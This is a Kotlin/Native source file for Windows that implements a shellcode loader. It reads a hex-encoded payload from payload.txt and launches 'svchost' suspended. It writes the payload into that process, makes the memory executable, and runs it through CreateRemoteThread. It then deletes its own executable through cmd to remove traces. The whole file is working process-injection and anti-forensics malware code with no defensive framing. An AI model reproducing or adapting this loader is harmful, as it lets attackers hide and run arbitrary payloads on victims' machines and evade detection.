package com.xhstormr.app

import kotlin.system.exitProcess
import kotlinx.cinterop.ByteVar
import kotlinx.cinterop.UIntVar
import kotlinx.cinterop.UShortVar
import kotlinx.cinterop.alloc
import kotlinx.cinterop.allocArray
import kotlinx.cinterop.convert
import kotlinx.cinterop.memScoped
import kotlinx.cinterop.ptr
import kotlinx.cinterop.readBytes
import kotlinx.cinterop.toCValues
import kotlinx.cinterop.toKString
import kotlinx.cinterop.value
import kotlinx.cinterop.wcstr
import platform.posix.P_OVERLAY
import platform.posix.SEEK_END
import platform.posix.fclose
import platform.posix.fopen
import platform.posix.fread
import platform.posix.fseek
import platform.posix.ftell
import platform.posix.rewind
import platform.posix.spawnlp
import platform.posix.sprintf
import platform.windows.CREATE_SUSPENDED
import platform.windows.CreateProcessW
import platform.windows.CreateRemoteThread
import platform.windows.GetModuleFileNameW
import platform.windows.LPTHREAD_START_ROUTINE
import platform.windows.MAX_PATH
import platform.windows.MEM_COMMIT
import platform.windows.PAGE_EXECUTE_READ
import platform.windows.PAGE_READWRITE
import platform.windows.PROCESS_INFORMATION
import platform.windows.STARTUPINFO
import platform.windows.VirtualAllocEx
import platform.windows.VirtualProtectEx
import platform.windows.WriteProcessMemory

fun String.hex2byte() =
    this.chunked(2) { it.toString().toInt(16).toByte() }.toByteArray()

fun readFile(fileName: String): ByteArray? {
    val file = fopen(fileName, "rb") ?: return null
    try {
        fseek(file, 0, SEEK_END)
        val fileSize = ftell(file)
        rewind(file)

        memScoped {
            val bytes = allocArray<ByteVar>(fileSize)
            fread(bytes, 1.convert(), fileSize.convert(), file)
            return bytes.readBytes(fileSize)
        }
    } finally {
        fclose(file)
    }
}

fun main() {
    memScoped {
        val raw = readFile("""payload.txt""")?.decodeToString()?.hex2byte() ?: exitProcess(0)
        val rawSize = raw.size

        val si = alloc<STARTUPINFO>()
        val pi = alloc<PROCESS_INFORMATION>()

        val protect = alloc<UIntVar> {
            value = PAGE_READWRITE.convert()
        }

        CreateProcessW(null, "svchost".wcstr.ptr, null, null, 0, CREATE_SUSPENDED, null, null, si.ptr, pi.ptr)
        val ptr = VirtualAllocEx(pi.hProcess, null, rawSize.convert(), MEM_COMMIT, protect.value)
        WriteProcessMemory(pi.hProcess, ptr, raw.toCValues().ptr, rawSize.convert(), null)
        VirtualProtectEx(pi.hProcess, ptr, rawSize.convert(), PAGE_EXECUTE_READ, protect.ptr)
        CreateRemoteThread(pi.hProcess, null, 0.convert(), ptr as LPTHREAD_START_ROUTINE, null, 0.convert(), null)
    }

    memScoped {
        val path = allocArray<UShortVar>(MAX_PATH)
        val args = allocArray<ByteVar>(MAX_PATH)
        GetModuleFileNameW(null, path, MAX_PATH)
        sprintf(args, """/c del "%s"""", path.toKString())
        spawnlp(P_OVERLAY, "cmd", args.toKString(), null)
    }
}
